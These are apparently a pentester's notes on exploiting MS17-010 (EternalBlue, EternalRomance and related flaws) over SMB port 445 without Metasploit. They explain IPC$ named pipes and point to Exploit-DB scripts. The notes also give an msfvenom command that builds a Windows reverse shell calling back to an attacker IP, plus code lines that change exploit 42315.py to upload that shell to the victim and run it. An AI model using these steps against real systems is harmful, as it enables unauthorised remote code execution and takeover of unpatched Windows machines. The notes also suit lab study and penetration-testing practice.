# Automated Eternalblue _MS_17_010_ without metasploit : #

References:
  https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010

Port No. : 445 only(and not 139)

Metasploit Modules:
1. auxiliary/admin/smb/ms17_010_command			MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
2. auxiliary/scanner/smb/smb_ms17_010			MS17-010 SMB RCE Detection
3. exploit/windows/smb/ms17_010_eternalblue		MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
4. exploit/windows/smb/ms17_010_eternalblue_win8	MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
5. exploit/windows/smb/ms17_010_psexec			MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution


IPC$:
IPC$ is a special share within Windows that is used to facilitate inter-process communication more commonly referred to as IPC. That is, it doesn’t allow one to access files or directories like other shares, but rather allows one to communicate with processes running on the remote system. Specifically, IPC$ exposes named pipes, that one can write to or read from to communicate with remote processes. Such named pipes are created when an application opens a pipe and registers it with the Windows Server service (SMB), such that it can be exposed by the IPC$ share. Any data written to such a named pipe is sent to the remote process, and conversely any output data written by the remote process can be read by a local application from the pipe. One can use such named pipes to execute specific functions, often referred to as Remote Procedure Calls (RPC) on the remote system.

  
  ## Module 3: MS-17-010 Scanner: ##
 
  Scans for CVE:
  2017-0147
  2017-0146
  2017-0148 
  2017-0145 
  2017-0144 
  2017-0143 

## Module 1 & 5: (Not Eternal Blue) => CVE-2017-0143 & CVE-2017-0146 ##


Requires named pipe and for that IPC$ share should be accessible. 
And for IPC$ to be accessible normal users credentials are required.

Reference:
http://www.ethicalpentest.com/2018/03/ms17-010-vulnerability-eternalromance-windows-10-windows-2008-r2.html
https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/

As if EternalBlue wasn't devastating enough, three more similar exploits were developed after it. EternalRomance and EternalSynergy exploit a type of confusion (CVE-2017-0143), while EternalChampion and EternalSynergy exploit a race condition (CVE-2017-0146).

These were combined into a single Metasploit module that also uses the classic psexec payload. It's considered more reliable than EternalBlue, less likely to crash the target, and works on all recent unpatched versions of Windows, up to Server 2016 and Windows 10.

The only caveat is this exploit requires a named pipe. Named pipes provide a method for running processes to communicate with one another, usually appearing as a file for other processes to attach to. The Metasploit module automatically checks for named pipes, making it pretty straightforward to use as long as a named pipe is present on the target.


## Module 3: Eternal Blue => CVE-2017-0144 ##

Exploit-db links:
https://www.exploit-db.com/exploits/42315	(More reliable but namedpipe is required).
https://www.exploit-db.com/exploits/42031	

## Exploiting Eternal Blue without Metasploit: ##

### 1. Using Exploit db-https://www.exploit-db.com/exploits/42315: ###

Download exploit from above link and also download mysmb.py from link specified at explit db and also make sure impacket is installed (install using pip)

Since namedpipe is required but it is not mandaory to specify one but IPC$ share should be accessible(if anonymous login dont allow its access then user's cred required)
By default it only pwned.txt file at root locaion of C.

(Since on my local window 7 with anonymous login IPC$ is not accessible therefore it will only work when give valid user creds: mansoor-r and 123 as password).

To get reverse shell:
generate reverse shell using msfvenom: (this will work on both 32 and 64 bit)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.53 LPORT=9898 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse_shell.exe

In 42315.py uncomment smb_send_file and replace it with below lines:
smb_send_file(smbConn, '/root/coaching_machine/reverse_shell.exe','C','/windows/temp/reverse_shell.exe')    #It copies reverse shell to victim machine.
service_exec(conn, r'cmd /c c:\\windows\temp\reverse_shell.exe')
#It is recommended to give garbage name to shell.exe as without migration it is not possible to delete this file from admin access cmd.

And you will recieve reverse shell on nc.

### 2. Using Exploit db-https://www.exploit-db.com/exploits/42031 : ###
 
Dont require named pipe (IPC$) and thus purely unauthenticated exploit for RCE but system crashes many times while using this exploit.

(All below payload uses exploit 42031.py but only it generate shellcode which is needed to be supplied along with this exploit).

Reference: https://root4loot.com/post/eternalblue_manual_exploit/

### Exploit : ###
self made exploit of eternal_blue: eternalblue_exploit.sh
./eternalblue_exploit.sh 
and start listner in new tab
